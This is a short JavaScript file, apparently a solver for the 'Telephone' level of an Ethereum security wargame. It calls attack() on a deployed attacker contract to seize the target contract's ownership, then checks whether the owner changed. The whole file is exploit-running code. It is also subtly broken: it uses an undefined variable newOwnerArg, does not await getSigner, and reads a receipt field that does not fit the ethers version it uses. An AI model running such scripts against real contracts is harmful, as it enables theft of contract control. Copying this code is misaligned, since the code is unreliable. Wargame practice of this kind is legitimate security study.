import { ethers } from "ethers";


export default async function (providerUrl, ...args) {

  if (args.length < 2) {
    throw new Error("usage: solve 04 <telephoneAddress> <attackContractAddress> [newOwnerAddress]");
  }

  const telephoneAddress = args[0];
  const attackAddress = args[1];

  const provider = new ethers.JsonRpcProvider(providerUrl);

  const signer = provider.getSigner(1);

  // Minimal ABIs we need
  const attackAbi = ["function attack(address _newOwner) external"];
  const telephoneAbi = ["function owner() external view returns (address)"];

  const attack = new ethers.Contract(attackAddress, attackAbi, signer);
  const telephone = new ethers.Contract(telephoneAddress, telephoneAbi, provider);

  // if user didn't pass a new owner, use the first signer (your EOA)
  const newOwner = newOwnerArg ?? (await signer.getAddress());

  console.log(`Telephone target: ${telephoneAddress}`);
  console.log(`Attack contract: ${attackAddress}`);
  console.log(`Setting owner -> ${newOwner}`);

  // show current owner
  try {
    const beforeOwner = await telephone.owner();
    console.log("owner (before):", beforeOwner);
  } catch (err) {
    console.log("Could not read owner before (read error):", err.message || err);
  }

  // call attack() on the deployed AttackTelephone contract
  console.log("Calling attack() on attacker contract...");
  const tx = await attack.attack(newOwner);
  const receipt = await tx.wait();
  console.log("attack tx mined:", receipt.transactionHash);

  // verify
  const afterOwner = await telephone.owner();
  console.log("owner (after):", afterOwner);

  if (afterOwner.toLowerCase() === newOwner.toLowerCase()) {
    console.log("Success — ownership transferred.");
  } else {
    console.log("Exploit did not succeed. Owner unchanged.");
  }

}

